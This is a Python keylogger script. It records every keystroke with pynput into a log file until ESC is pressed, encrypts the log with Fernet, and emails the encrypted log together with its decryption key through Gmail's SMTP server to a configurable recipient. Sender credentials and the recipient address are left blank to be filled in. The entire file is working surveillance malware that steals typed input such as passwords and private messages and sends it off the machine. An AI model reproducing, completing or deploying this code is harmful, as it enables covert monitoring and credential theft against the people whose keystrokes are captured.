from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os

# File paths and email credentials
keys_information = "key_log.txt"
file_path = r"" # add the key_log.txt file path
email_address = "" #add the sender email address
password = "" #write the app password for sender email account
toaddr = "" #add the receiver email address

# Initialize global variables for key logging
count = 0
keys = []

def send_email(filenames, attachments, toaddr):
    """
    Sends an email with multiple attachments.

    Args:
    - filenames: List of filenames for the attachments.
    - attachments: List of file paths for the attachments.
    - toaddr: Recipient email address.
    """
    fromaddr = email_address
    msg = MIMEMultipart()  # Create a multipart message
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log Files and Key"  # Subject of the email

    # Email body
    body = "Please find the attached log files and encryption key."
    msg.attach(MIMEText(body, 'plain'))

    # Attach multiple files
    for filename, attachment in zip(filenames, attachments):
        with open(attachment, 'rb') as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())  # Read file contents
            encoders.encode_base64(part)  # Encode file to base64
            part.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(part)  # Attach file to the email

    # Send the email
    with smtplib.SMTP('smtp.gmail.com', 587) as s:
        s.starttls()  # Upgrade to secure connection
        s.login(fromaddr, password)  # Login to the SMTP server
        s.sendmail(fromaddr, toaddr, msg.as_string())  # Send the email

def press(key):
    """
    Callback function for key press events.

    Args:
    - key: The key that was pressed.
    """
    global keys, count

    print(key)  # Print the key to the console
    keys.append(key)  # Append key to the list
    count += 1

    # Write to file if a certain count is reached
    if count >= 1:
        count = 0
        write_file(keys)  # Write collected keys to file
        keys = []  # Reset the list

def write_file(keys):
    """
    Writes logged keys to the file.

    Args:
    - keys: List of keys to be written to the file.
    """
    with open(file_path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")  # Clean key string
            if k.find("space") > 0:
                f.write('\n')  # Add a newline for spaces
            elif k.find("Key") == -1:
                f.write(k)  # Write the key character

def release(key):
    """
    Callback function for key release events.

    Args:
    - key: The key that was released.
    """
    if key == Key.esc:
        return False  # Stop listener if ESC key is pressed

# Start the key logger
with Listener(on_press=press, on_release=release) as listener:
    listener.join()

# Generate a new encryption key
key = Fernet.generate_key()
fernet = Fernet(key)  # Initialize Fernet with the generated key

# Read the data from the key log file
with open(file_path, 'rb') as f:
    data = f.read()

# Encrypt the data
encrypted = fernet.encrypt(data)

# Save the encrypted data to a new file
with open("encrypted_file", 'wb') as f:
    f.write(encrypted)

# Save the encryption key to a file for later decryption
with open("secret.key", 'wb') as key_file:
    key_file.write(key)

# Send the encrypted file and the secret key in one email
send_email(
    filenames=["encrypted_file", "secret.key"],  # Filenames for the attachments
    attachments=["encrypted_file", "secret.key"],  # File paths for the attachments
    toaddr=toaddr  # Recipient email address
)
